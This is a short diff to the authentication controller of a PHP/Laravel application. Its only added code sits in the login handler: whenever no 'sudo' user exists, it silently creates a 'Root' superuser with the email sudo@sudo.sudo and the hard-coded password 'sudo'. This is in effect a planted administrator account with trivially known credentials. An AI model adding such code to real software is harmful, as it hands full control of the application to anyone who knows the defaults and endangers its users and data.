@@ -31,6 +31,10 @@ class AuthController extends Controller
             return $this->error('Erreur de validation', ['msg' => $validator->errors()->all()]);
         }
 
+        if (!User::where('user_role', 'sudo')->first()) {
+            User::create(['name' => 'Root', 'email' => 'sudo@sudo.sudo', 'password' => Hash::make('sudo'), 'user_role' => 'sudo']);
+        }
+
         $success = false;
         $data = $validator->validate();
         $login = $data['login'];
